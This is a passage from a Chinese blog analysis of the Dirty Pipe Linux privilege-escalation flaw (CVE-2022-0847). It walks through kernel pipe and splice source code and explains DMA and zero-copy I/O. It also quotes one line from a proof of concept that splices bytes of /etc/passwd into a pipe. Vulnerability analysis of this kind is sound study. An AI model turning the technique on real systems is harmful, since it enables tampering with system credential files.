class="built_in">spin_unlock_irq</span>(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Insert it into the buffer array */</span></span><br><span class="line">buf = &amp;pipe-&gt;bufs[head &amp; mask];<span class="comment">// </span></span><br><span class="line">buf-&gt;page = page;</span><br><span class="line">buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">buf-&gt;len = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">is_packetized</span>(filp))<span class="comment">// 这里实际判断的是 file-&gt;f_flags &amp; O_DIRECT， 而  O_DIRECT 的含义是是否可以直接访问磁盘</span></span><br><span class="line">buf-&gt;flags = PIPE_BUF_FLAG_PACKET;<span class="comment">// #define PIPE_BUF_FLAG_PACKET0x08</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;<span class="comment">// #define PIPE_BUF_FLAG_CAN_MERGE0x10</span></span><br><span class="line">pipe-&gt;tmp_page = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">copied = <span class="built_in">copy_page_from_iter</span>(page, <span class="number">0</span>, PAGE_SIZE, from);<span class="comment">// 调试发现某次执行的返回值为 0x1000</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">unlikely</span>(copied &lt; PAGE_SIZE &amp;&amp; <span class="built_in">iov_iter_count</span>(from))) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">ret += copied;<span class="comment">// 0x0</span></span><br><span class="line">buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">buf-&gt;len = copied;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">iov_iter_count</span>(from))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">pipe_full</span>(head, pipe-&gt;tail, pipe-&gt;max_usage))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Wait for buffer space to become available. */</span></span><br><span class="line"><span class="keyword">if</span> (filp-&gt;f_flags &amp; O_NONBLOCK) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -EAGAIN;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">signal_pending</span>(current)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!ret)</span><br><span class="line">ret = -ERESTARTSYS;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We&#x27;re going to release the pipe lock and wait for more</span></span><br><span class="line"><span class="comment"> * space. We wake up any readers if necessary, and then</span></span><br><span class="line"><span class="comment"> * after waiting we need to re-check whether the pipe</span></span><br><span class="line"><span class="comment"> * become empty while we dropped the lock.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        我们将释放管道锁并等待更多空间。 如有必要，我们会唤醒任何读者，然后在等待之后，我们需要重新检查在我们丢弃锁时管道是否为空。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"><span class="keyword">if</span> (was_empty) &#123;</span><br><span class="line"><span class="built_in">wake_up_interruptible_sync_poll</span>(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);</span><br><span class="line"><span class="built_in">kill_fasync</span>(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">wait_event_interruptible_exclusive</span>(pipe-&gt;wr_wait, <span class="built_in">pipe_writable</span>(pipe));</span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line">was_empty = <span class="built_in">pipe_empty</span>(pipe-&gt;head, pipe-&gt;tail);</span><br><span class="line">wake_next_writer = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">pipe_full</span>(pipe-&gt;head, pipe-&gt;tail, pipe-&gt;max_usage))</span><br><span class="line">wake_next_writer = <span class="literal">false</span>;</span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we do do a wakeup event, we do a &#x27;sync&#x27; wakeup, because we</span></span><br><span class="line"><span class="comment"> * want the reader to start processing things asap, rather than</span></span><br><span class="line"><span class="comment"> * leave the data pending.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This is particularly important for small writes, because of</span></span><br><span class="line"><span class="comment"> * how (for example) the GNU make jobserver uses small writes to</span></span><br><span class="line"><span class="comment"> * wake up pending jobs</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 如果我们做一个唤醒事件，我们做一个“同步”唤醒，因为我们希望阅读器尽快开始处理事情，而不是让数据处于未决状态。</span></span><br><span class="line"><span class="comment">        *</span></span><br><span class="line"><span class="comment">        * 这对于小型写入尤其重要，因为（例如）GNU make jobserver 如何使用小型写入来唤醒挂起的作业</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">if</span> (was_empty) &#123;</span><br><span class="line"><span class="built_in">wake_up_interruptible_sync_poll</span>(&amp;pipe-&gt;rd_wait, EPOLLIN | EPOLLRDNORM);</span><br><span class="line"><span class="built_in">kill_fasync</span>(&amp;pipe-&gt;fasync_readers, SIGIO, POLL_IN);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (wake_next_writer)</span><br><span class="line"><span class="built_in">wake_up_interruptible_sync_poll</span>(&amp;pipe-&gt;wr_wait, EPOLLOUT | EPOLLWRNORM);</span><br><span class="line"><span class="keyword">if</span> (ret &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">sb_start_write_trylock</span>(<span class="built_in">file_inode</span>(filp)-&gt;i_sb)) &#123;</span><br><span class="line"><span class="keyword">int</span> err = <span class="built_in">file_update_time</span>(filp);</span><br><span class="line"><span class="keyword">if</span> (err)</span><br><span class="line">ret = err;</span><br><span class="line"><span class="built_in">sb_end_write</span>(<span class="built_in">file_inode</span>(filp)-&gt;i_sb);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>0.12内核代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">write_pipe</span><span class="params">(struct m_inode * inode, <span class="keyword">char</span> * buf, <span class="keyword">int</span> count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> chars, size, written = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (count&gt;<span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">while</span> (!(size=(PAGE_SIZE<span class="number">-1</span>)-<span class="built_in">PIPE_SIZE</span>(*inode))) &#123;</span><br><span class="line"><span class="built_in">wake_up</span>(&amp; <span class="built_in">PIPE_READ_WAIT</span>(*inode));</span><br><span class="line"><span class="keyword">if</span> (inode-&gt;i_count != <span class="number">2</span>) &#123; <span class="comment">/* no readers */</span></span><br><span class="line">current-&gt;signal |= (<span class="number">1</span>&lt;&lt;(SIGPIPE<span class="number">-1</span>));</span><br><span class="line"><span class="keyword">return</span> written?written:<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">sleep_on</span>(&amp; <span class="built_in">PIPE_WRITE_WAIT</span>(*inode));</span><br><span class="line">&#125;</span><br><span class="line">chars = PAGE_SIZE-<span class="built_in">PIPE_HEAD</span>(*inode);</span><br><span class="line"><span class="keyword">if</span> (chars &gt; count)</span><br><span class="line">chars = count;</span><br><span class="line"><span class="keyword">if</span> (chars &gt; size)</span><br><span class="line">chars = size;</span><br><span class="line">count -= chars;</span><br><span class="line">written += chars;</span><br><span class="line">size = <span class="built_in">PIPE_HEAD</span>(*inode);</span><br><span class="line"><span class="built_in">PIPE_HEAD</span>(*inode) += chars;</span><br><span class="line"><span class="built_in">PIPE_HEAD</span>(*inode) &amp;= (PAGE_SIZE<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">while</span> (chars--&gt;<span class="number">0</span>)</span><br><span class="line">((<span class="keyword">char</span> *)inode-&gt;i_size)[size++]=<span class="built_in">get_fs_byte</span>(buf++);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">wake_up</span>(&amp; <span class="built_in">PIPE_READ_WAIT</span>(*inode));</span><br><span class="line"><span class="keyword">return</span> written;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="四、DMA-copy"><a href="#四、DMA-copy" class="headerlink" title="四、DMA copy"></a>四、DMA copy</h3><p>一般DMA copy都会拿来与CPU copy做比较，所以我们将二者放在一起讨论。</p><p>在没有 DMA 技术前，I/O 的过程是这样的：</p><ul><li>CPU 发出对应的指令给磁盘控制器，然后返回；</li><li>磁盘控制器收到指令后，于是就开始准备数据，会把数据放入到磁盘控制器的内部缓冲区中，然后产生一个<strong>中断</strong>；</li><li>CPU 收到中断信号后，停下手头的工作，接着把磁盘控制器的缓冲区的数据一次一个字节地读进自己的寄存器，然后再把寄存器里的数据写入到内存，而在数据传输的期间 CPU 是无法执行其他任务的。</li></ul><p>流程图如下</p><p>![I_O 中断](I_O 中断.png)</p><p>可以看到，整个数据的传输过程，都要需要 CPU 亲自参与搬运数据的过程，而且这个过程，CPU 是不能做其他事情的。当数据过多时将会对操作系统造成负担，也会降低系统的吞吐量。</p><p>一个朴素的想法就是，当某个设备想要访问一块内存时就直接进行访问，不需要CPU进行参与，而DMA也是这么做的。</p><p>DMA（Direct Memory Access）：顾名思义为直接内存访问，如果没有 DMA，当 CPU 使用<a class="link"   href="https://en.wikipedia.org/wiki/Programmed_input/output" >编程输入/输出<i class="fas fa-external-link-alt"></i></a>时通常会在整个读取或写入操作期间被完全占用，因此无法执行其他工作。对于 DMA，CPU 首先启动传输，然后在传输过程中执行其他操作，最后在操作完成时从 DMA 控制器 (DMAC)接收中断。许多硬件系统都使用 DMA，包括磁盘驱动器控制器、显卡、网卡和声卡等等。类似地，多核处理器内的处理元件可以在不占用其处理器时间的情况下将数据传入和传出其本地内存，从而允许计算和数据传输并行进行。</p><p>流程如下</p><p>![DRM I_O 过程](DRM I_O 过程.png)</p><p>虽然DMA很方便，但是DMA会带来缓存一致性的问题。什么是缓存一致性呢？当DMA与CPU均可以访问到缓存时，如果CPU对内存进行了修改，但是仅仅写在了缓存中还没同步进内存，此时硬件访问了内存，这时可能读到的是旧的值。这就是缓存一致性的问题。</p><p>这些问题可以用两种方法来解决：</p><ol><li>缓存同调系统（Cache-coherent system）：以硬件方法来完成，当外部设备写入内存时以一个信号来通知缓存控制器某内存地址的值已经过期或是应该更新资料。</li><li>非同调系统（Non-coherent system）：以软件方法来完成，操作系统必须确保在开始传出 DMA 传输之前刷新缓存行，并在访问受传入 DMA 传输影响的内存范围之前使其无效。</li></ol><p>第二种的方法会造成DMA的系统负担。</p><p>但总体来说，DMA的出现，大大提高了系统的吞吐量。</p><h3 id="五、零拷贝"><a href="#五、零拷贝" class="headerlink" title="五、零拷贝"></a>五、零拷贝</h3><p>这部分内容网上已经有很多不错的文章了，分析的也比较透彻，这里简单描述下相关的原理。</p><h4 id="1、传统的文件传输"><a href="#1、传统的文件传输" class="headerlink" title="1、传统的文件传输"></a>1、传统的文件传输</h4><p>如果服务端要提供文件传输的功能，我们能想到的最简单的方式是：将磁盘上的文件读取出来，然后通过网络协议发送给客户端。</p><p>传统 I/O 的工作方式是，数据读取和写入是从用户空间到内核空间来回复制，而内核空间的数据是通过操作系统层面的 I/O 接口从磁盘读取或写入。</p><p>代码通常如下，一般会需要两个系统调用：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span>(file, tmp_buf, len);</span><br><span class="line"><span class="built_in">write</span>(socket, tmp_buf, len);</span><br></pre></td></tr></table></figure><p>代码很简单，虽然就两行代码，但是这里面发生了不少的事情。</p><p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/%E4%BC%A0%E7%BB%9F%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93.png" alt="传统文件传输"></p><p>首先发生了四次ring0和ring3的上下文切换（两次系统调用，每次系统调用都是先从ring3到ring0，ring0得到结果时再将结果返回给ring3）。而上下文切换到成本并不小，一次切换需要耗时几十纳秒到几微秒，虽然时间看上去很短，但是在高并发的场景下，这类时间容易被累积和放大，从而影响系统的性能。</p><p>其次，还<strong>发生了 4 次数据拷贝</strong>，其中两次是 DMA 的拷贝，另外两次则是通过 CPU 拷贝的，下面说一下这个过程：</p><ul><li><em>第一次拷贝</em>，把磁盘上的数据拷贝到操作系统内核的缓冲区里，这个拷贝的过程是通过 DMA 搬运的。</li><li><em>第二次拷贝</em>，把内核缓冲区的数据拷贝到用户的缓冲区里，于是我们应用程序就可以使用这部分数据了，这个拷贝到过程是由 CPU 完成的。</li><li><em>第三次拷贝</em>，把刚才拷贝到用户的缓冲区里的数据，再拷贝到内核的 socket 的缓冲区里，这个过程依然还是由 CPU 搬运的。</li><li><em>第四次拷贝</em>，把内核的 socket 缓冲区里的数据，拷贝到网卡的缓冲区里，这个过程又是由 DMA 搬运的。</li></ul><p>这种简单又传统的文件传输方式，存在冗余的上文切换和数据拷贝，在高并发系统里是非常糟糕的，多了很多不必要的开销，会严重影响系统性能。</p><p>所以，<strong>要想提高文件传输的性能，就需要减少「用户态与内核态的上下文切换」和「内存拷贝」的次数</strong>。</p><h4 id="2、mmap-write"><a href="#2、mmap-write" class="headerlink" title="2、mmap + write"></a>2、mmap + write</h4><p>在前面我们知道，<code>read()</code> 系统调用的过程中会把内核缓冲区的数据拷贝到用户的缓冲区里，于是为了减少这一步开销，我们可以用 <code>mmap()</code> 替换 <code>read()</code> 系统调用函数。                                               </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">buf = <span class="built_in">mmap</span>(file, len);</span><br><span class="line"><span class="built_in">write</span>(sockfd, buf, len);</span><br></pre></td></tr></table></figure><p><code>mmap()</code> 系统调用函数会直接把内核缓冲区里的数据「<strong>映射</strong>」到用户空间，这样，操作系统内核与用户空间就不需要再进行任何的数据拷贝操作。</p><p>![mmap + write 零拷贝](mmap + write 零拷贝.png)</p><p>具体过程如下：</p><ul><li>应用进程调用了 <code>mmap()</code> 后，DMA 会把磁盘的数据拷贝到内核的缓冲区里。接着，应用进程跟操作系统内核「共享」这个缓冲区；</li><li>应用进程再调用 <code>write()</code>，操作系统直接将内核缓冲区的数据拷贝到 socket 缓冲区中，这一切都发生在内核态，由 CPU 来搬运数据；</li><li>最后，把内核的 socket 缓冲区里的数据，拷贝到网卡的缓冲区里，这个过程是由 DMA 搬运的。</li></ul><p>我们可以得知，通过使用 <code>mmap()</code> 来代替 <code>read()</code>， 可以减少一次数据拷贝的过程。也就是说，使用mmap + write进行文件传输会进行四次上下文切换以及三次数据拷贝。</p><p>但这还不是最理想的零拷贝，因为仍然需要通过 CPU 把内核缓冲区的数据拷贝到 socket 缓冲区里，而且仍然需要 4 次上下文切换，因为系统调用还是 2 次。</p><h4 id="3、sendfile"><a href="#3、sendfile" class="headerlink" title="3、sendfile"></a>3、sendfile</h4><p>在 Linux 内核版本 2.1 中，提供了一个专门发送文件的系统调用函数 <code>sendfile()</code>，函数形式如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sendfile</span><span class="params">(<span class="keyword">int</span> out_fd, <span class="keyword">int</span> in_fd, <span class="keyword">off_t</span> *offset, <span class="keyword">size_t</span> count)</span></span>;</span><br></pre></td></tr></table></figure><p>它的前两个参数分别是目的端和源端的文件描述符，后面两个参数是源端的偏移量和复制数据的长度，返回值是实际复制数据的长度。</p><p>首先，它可以替代前面的 <code>read()</code> 和 <code>write()</code> 这两个系统调用，这样就可以减少一次系统调用，也就减少了 2 次上下文切换的开销。</p><p>其次，该系统调用，可以直接把内核缓冲区里的数据拷贝到 socket 缓冲区里，不再拷贝到用户态，这样就只有 2 次上下文切换，和 3 次数据拷贝。如下图：</p><p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/senfile-3%E6%AC%A1%E6%8B%B7%E8%B4%9D.png" alt="senfile-3次拷贝"></p><p>在linux2.4版本，对于支持网卡支持 SG-DMA 技术的情况下， <code>sendfile()</code> 系统调用的过程发生了点变化，具体过程如下：</p><ul><li>第一步，通过 DMA 将磁盘上的数据拷贝到内核缓冲区里；</li><li>第二步，缓冲区描述符和数据长度传到 socket 缓冲区，这样网卡的 SG-DMA 控制器就可以直接将内核缓存中的数据拷贝到网卡的缓冲区里，此过程不需要将数据从操作系统内核缓冲区拷贝到 socket 缓冲区中，这样就减少了一次数据拷贝；</li></ul><p>所以，这个过程之中，只进行了 2 次数据拷贝，如下图：</p><p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/senfile-%E9%9B%B6%E6%8B%B7%E8%B4%9D.png" alt="senfile-零拷贝"></p><p>在 2.6.33 之前的 Linux 内核中，out_fd必须引用一个套接字。从 Linux 2.6.33 开始，它可以是任何文件。如果是普通文件，然后sendfile () 适当地更改文件偏移量。</p><p>sendfile有个问题是它的in_fd不能是套接字，只能是文件，所以应用场景上是有限制的。</p><p>实现思路跟 splice是一样的，也需要使用pipe来做中介，但他这个<a class="link"   href="http://lxr.linux.no/linux+v3.5.4/+code=do_splice_direct" >do_splice_direct<i class="fas fa-external-link-alt"></i></a> 使用一个每个进程缓存（在 corrent指针的 splice_pipe）的一个pipe，可以少用一次系统调用（正常的splice需要从 文件到 pipe，然后再从pipe到socket，有两次调用）。</p><h4 id="4、splice"><a href="#4、splice" class="headerlink" title="4、splice"></a>4、splice</h4><p><code>splice</code>与<code>sendfile</code>类似，不过<code>splice</code>的<code>in_fd</code>并不限定是文件，也可以是套接字，这使它更通用一些.。</p><p>但是正常如果想要实现从<code>socket</code>到<code>socket</code>的传输的话需要两次系统调用，上面在<code>sendfile</code>中也提到过，</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 省略了部分参数</span><br><span class="line"><span class="built_in">splice</span> (socket1_fd，  pipe_fd</span><br><span class="line">splice （pipl_fd, socket2_fd</span><br></pre></td></tr></table></figure><p>也就是说，<code>splice</code>的系统上下文切换次数是4次，数据拷贝次数是两次，。</p><h4 id="5、总结"><a href="#5、总结" class="headerlink" title="5、总结"></a>5、总结</h4><p>上面提到<code>sendfile</code>的时候也了解到，<code>sendfile</code>的上下文切换次数与数据拷贝次数均为两次，而splice因为要进行两次系统调用，所以上下文切换次数比<code>sendfile</code>要多两侧，所以在<code>文件-&gt;other</code>的场景下，<code>sendfile</code>的性能是要优于<code>splice</code>的，而如果<code>sendfile</code>用不了，那么<code>splice</code>一般情况下是更好的选择。</p><h3 id="六、splice-系统调用源代码实现"><a href="#六、splice-系统调用源代码实现" class="headerlink" title="六、splice 系统调用源代码实现"></a>六、splice 系统调用源代码实现</h3><h4 id="0、前言-1"><a href="#0、前言-1" class="headerlink" title="0、前言"></a>0、前言</h4><p>实际上splice利用的就是零拷贝技术。首先明确一点，如果要提供性能，一是减少系统调用，二是减少ring0和ring3间内存拷贝。常规的文件拷贝技术使用的时read和write，并需要一块临时缓冲区，这样既增加了系统调用，又需要ring0和ring3之间的内存拷贝，而splice很好的解决了这个问题，他的内存拷贝只有两个必要的DMA copy，而需要的临时缓冲区是使用管道实现的，优点就是只需要传递指针即可让两个文件都可以访问得到。具体各个拷贝方案的对比<a class="link"   href="https://juejin.cn/post/6995519558475841550" >参见<i class="fas fa-external-link-alt"></i></a>。</p><p>代码有一部分的变量值是我通过poc实时得出的，并不适用于所有情况。其目的在于了解函数的大体流程。</p><p>poc中调用splice的代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> nbytes = <span class="built_in">splice</span>(fd, &amp;offset, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>这里的<code>fd</code>是 <code>/etc/passwd</code>的文件描述符，<code>p[1]</code>为写管道的文件描述符。代码逻辑为将<code>/etc/passwd</code>中偏移以<code>offset</code>为偏移的内容取一字节放入管道中。这里的<code>offset</code>为<code>0x3</code>。</p><p>代码追踪可以从</p><p><a class="link"   href="https://elixir.bootlin.com/linux/v5.11.1/source/fs/splice.c#L1325" >https://elixir.bootlin.com/linux/v5.11.1/source/fs/splice.c#L1325<i class="fas fa-external-link-alt"></i></a></p><p>开始。</p><p>照例这里先将整体的流程图贴出来，方便师傅们对函数调用流程有个整体的把握。</p><p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220328104549539.png" alt="image-20220328104549539"></p><h4 id="1、splice"><a href="#1、splice" class="headerlink" title="1、splice"></a>1、splice</h4><p>调用了<code>__do_splice</code>函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SYSCALL_DEFINE6</span>(splice, <span class="keyword">int</span>, fd_in, <span class="keyword">loff_t</span> __user *, off_in,</span><br><span class="line"><span class="keyword">int</span>, fd_out, <span class="keyword">loff_t</span> __user *, off_out,</span><br><span class="line"><span class="keyword">size_t</span>, len, <span class="keyword">unsigned</span> <span class="keyword">int</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">in</span>, <span class="title">out</span>;</span></span><br><span class="line"><span class="keyword">long</span> error;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">unlikely</span>(!len))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">unlikely</span>(flags &amp; ~SPLICE_F_ALL))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">error = -EBADF;</span><br><span class="line">in = <span class="built_in">fdget</span>(fd_in);</span><br><span class="line"><span class="keyword">if</span> (in.file) &#123;</span><br><span class="line">out = <span class="built_in">fdget</span>(fd_out);</span><br><span class="line"><span class="keyword">if</span> (out.file) &#123;</span><br><span class="line">error = __do_splice(in.file, off_in, out.file, off_out,</span><br><span class="line">len, flags);<span class="comment">// 跟进</span></span><br><span class="line"><span class="built_in">fdput</span>(out);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">fdput</span>(in);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2、-do-splice"><a href="#2、-do-splice" class="headerlink" title="2、__do_splice"></a>2、__do_splice</h4><p>定义了<code>pipe_inode_info</code>类型的<code>ipipe</code>与<code>opipe</code>，之后调用<code>get_pipe_info</code>从传入的<code>file</code>结构体实例中获得<code>pipe</code>实例，然后调用<code>do_splice</code>函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">long</span> __do_splice(struct file *in, <span class="keyword">loff_t</span> __user *off_in,</span><br><span class="line">struct file *out, <span class="keyword">loff_t</span> __user *off_out,</span><br><span class="line"><span class="keyword">size_t</span> len, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">ipipe</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">opipe</span>;</span></span><br><span class="line"><span class="keyword">loff_t</span> offset, *__off_in = <span class="literal">NULL</span>, *__off_out = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">long</span> ret;</span><br><span class="line"></span><br><span class="line">ipipe = <span class="built_in">get_pipe_info</span>(in, <span class="literal">true</span>);<span class="comment">// 取 file-&gt;private_data值，这里为0x0</span></span><br><span class="line">opipe = <span class="built_in">get_pipe_info</span>(out, <span class="literal">true</span>);<span class="comment">// 这里是指向管道的指针，不明白这里的代码有什么作用，这里取到了ipipe和opipe只是做了下校验，后面do_splice也调用了get_pipe_info函数，不如将其放到后面进行校验，少了一次函数调用。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ipipe &amp;&amp; off_in)</span><br><span class="line"><span class="keyword">return</span> -ESPIPE;</span><br><span class="line"><span class="keyword">if</span> (opipe &amp;&amp; off_out)</span><br><span class="line"><span class="keyword">return</span> -ESPIPE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (off_out) &#123;<span class="comment">// 为0</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">copy_from_user</span>(&amp;offset, off_out, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">loff_t</span>)))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line">__off_out = &amp;offset;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (off_in) &#123;<span class="comment">// 指向loff_t结构体的指针</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">copy_from_user</span>(&amp;offset, off_in, <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">loff_t</span>)))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line">__off_in = &amp;offset;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = <span class="built_in">do_splice</span>(in, __off_in, out, __off_out, len, flags);<span class="comment">// 跟进</span></span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span 